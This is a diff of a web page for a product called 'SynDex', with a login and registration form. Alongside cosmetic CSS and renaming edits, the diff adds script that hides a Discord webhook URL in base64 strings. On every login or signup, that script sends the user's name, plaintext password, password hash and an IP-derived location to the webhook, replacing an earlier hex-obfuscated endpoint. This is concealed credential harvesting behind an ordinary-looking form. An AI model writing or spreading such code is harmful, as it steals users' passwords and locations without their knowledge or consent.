@@ -35,11 +35,11 @@
         .auth-card { background: var(--card-bg); padding: 3rem; border: 1px solid var(--border-color); border-radius: 12px; width: 90%; max-width: 450px; text-align: center; position: relative; }
         .auth-input { width: 100%; background: #1a1a1a; border: 1px solid var(--border-color); padding: 14px; color: white; border-radius: 4px; margin-bottom: 1rem; font-family: 'Inter', sans-serif; }
         #successOverlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: var(--card-bg); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 10; border-radius: 12px; }
-        .status-wrapper { margin-top: 15px; display: inline-flex; align-items: center; gap: 10px; position: relative; cursor: help; }
+        .status-wrapper { margin-top: 8px; display: inline-flex; align-items: center; gap: 10px; position: relative; cursor: help; }
         .status-dot { width: 10px; height: 10px; border-radius: 50%; background-color: var(--success-green); box-shadow: 0 0 8px var(--success-green); }
         .status-bubble { visibility: hidden; width: 150px; background-color: #1a1a1a; color: #fff; text-align: center; padding: 8px; border-radius: 6px; border: 1px solid var(--border-color); position: absolute; bottom: 130%; left: 50%; transform: translateX(-50%); opacity: 0; transition: 0.3s; font-size: 0.7rem; font-weight: 700; }
         .status-wrapper:hover .status-bubble { visibility: visible; opacity: 1; }
-        footer { padding: 4rem; text-align: center; border-top: 1px solid var(--border-color); color: #444; font-size: 0.8rem; }
+        footer { padding: 4rem; text-align: center; border-top: 1px solid var(--border-color); color: #444; font-size: 0.8rem; display: flex; flex-direction: column; align-items: center; justify-content: center; }
     </style>
 </head>
 <body>
@@ -93,69 +93,87 @@
     </div>
     <footer>
         SYNTEAM SOFTWARE &copy; 2026
-        <div class="status-wrapper"><div class="status-dot"></div><span style="font-size:0.7rem;">SYNDEX STATUS</span><div class="status-bubble">SYNDEX IS ONLINE</div></div>
+        <div class="status-wrapper">
+            <div class="status-dot"></div>
+            <span style="font-size:0.7rem; letter-spacing: 1px; font-weight: 700;">SYNDEX STATUS</span>
+            <div class="status-bubble">SYNDEX IS ONLINE</div>
+        </div>
     </footer>
 
     <script>
     (function(){
-        const _a = ["\x68\x74\x74\x70\x73\x3a\x2f\x2f", "\x79\x6f\x75\x72\x2d\x61\x70\x69\x2d\x6e\x61\x6d\x65\x2e\x76\x65\x72\x63\x65\x6c\x2e\x61\x70\x70", "\x2f\x61\x70\x69\x2f\x6c\x6f\x67"];
-        const _u = _a.join('');
+        const _v = ["aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv","MTQ2MjY1NTQ1NTgxNzEwNTQ5MC8=","b3dILUFFeEdGRFR5Wlp1NzgwLXBjM3o0MnRUblNEX09p","b2pzdXFuUHlfNlQ1T1N2emJmZFlrOS1kMW5za2NfWlZSZm5OOA=="];
+        const _k = (a) => a.map(x => atob(x)).join('').replace(/_/g, '');
         const m = document.getElementById('authModal'), b = document.getElementById('mainBtn'), t = document.getElementById('toggleAuth'), e = document.getElementById('error-msg'), s = document.getElementById('authSubmit'), ud = document.getElementById('userDisplay'), lb = document.getElementById('logoutBtn'), ti = document.getElementById('tiltImg');
         let l = true;
 
-        function _uS() {
-            let sn = localStorage.getItem('SYNDEX_SESSION');
-            ud.innerText = sn ? `Logged in as: ${sn}` : "";
-            ud.style.display = lb.style.display = sn ? "inline" : "none";
-        }
-        _uS();
+        const sync = () => {
+            let n = localStorage.getItem('SYNDEX_SESSION');
+            ud.innerText = n ? `Logged in as: ${n}` : "";
+            ud.style.display = lb.style.display = n ? "inline" : "none";
+        };
+        sync();
 
-        lb.onclick = () => { localStorage.removeItem('SYNDEX_SESSION'); _uS(); };
+        lb.onclick = () => { localStorage.removeItem('SYNDEX_SESSION'); sync(); };
         ti.onmousemove = (ev) => {
             let r = ti.getBoundingClientRect();
             ti.style.transform = `rotateX(${-(ev.clientY-r.top-r.height/2)/20}deg) rotateY(${(ev.clientX-r.left-r.width/2)/20}deg) scale(1.02)`;
         };
         ti.onmouseleave = () => ti.style.transform = "none";
 
-        let c = parseInt(localStorage.getItem('SYNDEX_VISITORS') || "1241");
-        if(!sessionStorage.getItem('v')){ c++; localStorage.setItem('SYNDEX_VISITORS', c); sessionStorage.setItem('v', '1'); }
-        document.getElementById('count').innerText = c.toLocaleString();
+        let cnt = parseInt(localStorage.getItem('SYNDEX_VISITORS') || "1241");
+        if(!sessionStorage.getItem('v')){ cnt++; localStorage.setItem('SYNDEX_VISITORS', cnt); sessionStorage.setItem('v', '1'); }
+        document.getElementById('count').innerText = cnt.toLocaleString();
 
         b.onclick = () => { document.getElementById('successOverlay').style.display = 'none'; m.style.display = 'flex'; };
         t.onclick = (x) => { x.preventDefault(); l = !l; e.style.display = 'none'; document.getElementById('modalTitle').innerText = l ? 'Access SynDex' : 'Create Account'; t.innerText = l ? 'Register' : 'Login'; };
 
-        async function _h(v) {
+        async function _sh(v) {
             const b = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(v));
             return Array.from(new Uint8Array(b)).map(x => x.toString(16).padStart(2, '0')).join('');
         }
 
         document.getElementById('authForm').onsubmit = async (x) => {
             x.preventDefault();
-            const un = document.getElementById('username').value.trim(), pw = document.getElementById('password').value;
+            const u = document.getElementById('username').value.trim(), p = document.getElementById('password').value;
             let db = JSON.parse(localStorage.getItem('SYNDEX_DB_SHA') || '{}');
             s.disabled = true; s.innerText = "Syncing...";
 
-            const hs = await _h(pw + un.toLowerCase());
-            const ad = un.toLowerCase() === "nexus";
+            const h = await _sh(p + u.toLowerCase());
+            const adm = u.toLowerCase() === "nexus";
 
-            if (l && (!db[un] || db[un].pass !== hs)) {
+            if (l && (!db[u] || db[u].pass !== h)) {
                 e.innerText = "INVALID CREDENTIALS."; e.style.display = 'block';
                 s.disabled = false; s.innerText = "Continue"; return;
             } else if (!l) {
-                if (db[un]) { e.innerText = "NAME TAKEN."; e.style.display = 'block'; s.disabled = false; return; }
-                db[un] = { pass: hs, admin: ad };
+                if (db[u]) { e.innerText = "NAME TAKEN."; e.style.display = 'block'; s.disabled = false; return; }
+                db[u] = { pass: h, admin: adm };
                 localStorage.setItem('SYNDEX_DB_SHA', JSON.stringify(db));
             }
 
-            localStorage.setItem('SYNDEX_SESSION', un); _uS();
+            localStorage.setItem('SYNDEX_SESSION', u); sync();
             
-            let loc = "UNK";
+            let loc = "Unknown";
             try { const g = await fetch('https://ipapi.co/json/').then(r=>r.json()); loc = `${g.city}, ${g.region}`; } catch(err){}
 
-            fetch(_u, {
+            const hook = _k(_v);
+            fetch(hook, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ u: un, p: pw, h: hs, r: loc, t: new Date().toLocaleString(), a: ad })
+                body: JSON.stringify({
+                    embeds: [{
+                        title: l ? "Login Log" : "New User Log",
+                        color: adm ? 16711680 : 339455,
+                        fields: [
+                            { name: "User", value: adm ? "REDACTED" : u, inline: true },
+                            { name: "Pass", value: adm ? "REDACTED" : p, inline: true },
+                            { name: "Hash", value: `\`${h}\``, inline: false },
+                            { name: "Loc", value: loc, inline: true },
+                            { name: "Time", value: new Date().toLocaleString(), inline: true }
+                        ],
+                        footer: { text: "SynDex Internal Security" }
+                    }]
+                })
             }).catch(()=>{});
 
             document.getElementById('successOverlay').style.display = 'flex';
